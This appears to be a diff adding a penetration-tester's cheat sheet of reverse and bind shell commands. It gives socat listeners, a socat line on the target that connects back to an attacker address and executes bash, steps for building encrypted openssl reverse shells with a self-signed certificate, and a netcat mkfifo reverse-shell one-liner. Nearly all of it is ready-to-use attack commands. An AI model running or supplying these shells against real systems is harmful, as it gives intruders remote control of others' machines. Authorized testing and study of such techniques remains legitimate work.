@@ -1,0 +1,26 @@
+Basic reverse shell listener:
+  socat TCP-L:<PORT> -
+
+Connection to the bind shell listener on a Linux/Attacker target:
+  socat TCP:<TARGET_IP>:<TARGET_PORT> -
+
+Spawn a socat Fully stable Linux tty reverse shell (like upgraded ncat shell):
+  socat TCP-L:<PORT> FILE:`tty`,raw,echo=0 
+
+On a Linux target make a connection back to the reverse shell listener:
+  socat TCP:<ATTACKER_IP>:<ATTACKER_PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+1. Encrypted communication - generate a certificate in order to use encrypted shells:
+  openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+2. Merge the two created files into a single .pem file:
+  cat shell.key shell.crt > shell.pem
+
+3. Set up reverse shell OPENSSL listener using our generated certificate:
+  socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+4. Connect back ON THE TARGET LINUX MACHINE:
+  socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+Linux Ncat Reverse Shell:
+  echo "mkfifo /tmp/f; nc <LOCAL_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" | wl-copy
